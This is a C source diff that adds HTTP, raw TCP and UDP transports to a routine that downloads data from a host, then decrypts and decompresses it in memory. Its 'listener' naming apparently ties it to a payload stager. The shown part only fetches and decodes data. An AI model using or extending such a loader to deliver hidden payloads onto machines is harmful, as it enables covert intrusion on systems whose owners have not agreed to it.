@@ -148,12 +148,12 @@ void derive_key_from_string(const char *str, uint8_t *key) {
 }
 
 /**
- * Downloads a file from a specified host and port, and decrypts and
- * decompresses it using the provided key.
+ * Downloads a file from a specified host and port using different protocols,
+ * and decrypts and decompresses it using the provided key.
  *
  * @param host The host to download the file from.
  * @param port The port to connect to.
- * @param path The path of the file on the server.
+ * @param path The path of the file on the server (for HTTP only).
  * @param key The decryption key.
  * @param buffer The buffer to write the downloaded data to.
  * @return The size of the decrypted and decompressed data.
@@ -161,20 +161,26 @@ void derive_key_from_string(const char *str, uint8_t *key) {
 size_t download_file(const char *host, const char *port, const char *path,
                      const uint8_t *key, char **buffer) {
   int sockfd;
-  struct addrinfo hints, *res;
-  char request[BUFFER_SIZE];
+  struct addrinfo hints, *res, *saved_res = NULL;
   char temp_buffer[BUFFER_SIZE];
   size_t data_size = 0;
 
   // Prepare the address info
   memset(&hints, 0, sizeof(hints));
   hints.ai_family = AF_UNSPEC;
+
+#ifdef LISTENER_UDP
+  hints.ai_socktype = SOCK_DGRAM;
+#else
   hints.ai_socktype = SOCK_STREAM;
+#endif
 
   if (getaddrinfo(host, port, &hints, &res) != 0) {
     DEBUG_PERROR("getaddrinfo");
     return 0;
   }
+  
+  saved_res = res; // Save for UDP sendto
 
   // Create the socket
   sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
@@ -184,29 +190,31 @@ size_t download_file(const char *host, const char *port, const char *path,
     return 0;
   }
 
-  // Connect to the server
+#ifndef LISTENER_UDP
+  // Connect to the server (TCP only)
   if (connect(sockfd, res->ai_addr, res->ai_addrlen) == -1) {
     DEBUG_PERROR("connect");
     close(sockfd);
     freeaddrinfo(res);
     return 0;
   }
-
   freeaddrinfo(res);
+#endif
 
-  // Prepare the HTTP GET request
+#ifdef LISTENER_HTTP
+  // HTTP protocol - send GET request
+  char request[BUFFER_SIZE];
   snprintf(request, sizeof(request),
            "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path,
            host);
 
-  // Send the request
   if (send(sockfd, request, strlen(request), 0) == -1) {
     DEBUG_PERROR("send");
     close(sockfd);
     return 0;
   }
 
-  // Read the response and store in memory
+  // Read the response and skip HTTP headers
   int header_end = 0;
   while (1) {
     ssize_t bytes_received = recv(sockfd, temp_buffer, sizeof(temp_buffer), 0);
@@ -214,7 +222,6 @@ size_t download_file(const char *host, const char *port, const char *path,
       break;
     }
 
-    // Skip HTTP headers
     if (!header_end) {
       char *header_end_ptr = strstr(temp_buffer, "\r\n\r\n");
       if (header_end_ptr) {
@@ -231,6 +238,53 @@ size_t download_file(const char *host, const char *port, const char *path,
       data_size += bytes_received;
     }
   }
+#elif defined(LISTENER_TCP)
+  // Raw TCP - read data directly
+  while (1) {
+    ssize_t bytes_received = recv(sockfd, temp_buffer, sizeof(temp_buffer), 0);
+    if (bytes_received <= 0) {
+      break;
+    }
+    *buffer = realloc(*buffer, data_size + bytes_received);
+    memcpy(*buffer + data_size, temp_buffer, bytes_received);
+    data_size += bytes_received;
+  }
+#elif defined(LISTENER_UDP)
+  // UDP - receive datagrams
+  struct sockaddr_storage src_addr;
+  socklen_t src_len = sizeof(src_addr);
+  
+  // Send key hash as authentication request
+  uint32_t key_hash = 0;
+  for (int i = 0; i < 16; i++) {
+    key_hash ^= ((uint32_t)key[i]) << ((i % 4) * 8);
+  }
+  
+  if (sendto(sockfd, &key_hash, sizeof(key_hash), 0, saved_res->ai_addr, saved_res->ai_addrlen) == -1) {
+    DEBUG_PERROR("sendto");
+    close(sockfd);
+    freeaddrinfo(saved_res);
+    return 0;
+  }
+  
+  // Receive data in chunks
+  while (1) {
+    ssize_t bytes_received = recvfrom(sockfd, temp_buffer, sizeof(temp_buffer), 0,
+                                      (struct sockaddr *)&src_addr, &src_len);
+    if (bytes_received <= 0) {
+      break;
+    }
+    // Check for end marker (4 zero bytes)
+    if (bytes_received == 4 && *(uint32_t *)temp_buffer == 0) {
+      break;
+    }
+    *buffer = realloc(*buffer, data_size + bytes_received);
+    memcpy(*buffer + data_size, temp_buffer, bytes_received);
+    data_size += bytes_received;
+  }
+  
+  freeaddrinfo(saved_res);
+#endif
 
   close(sockfd);
 
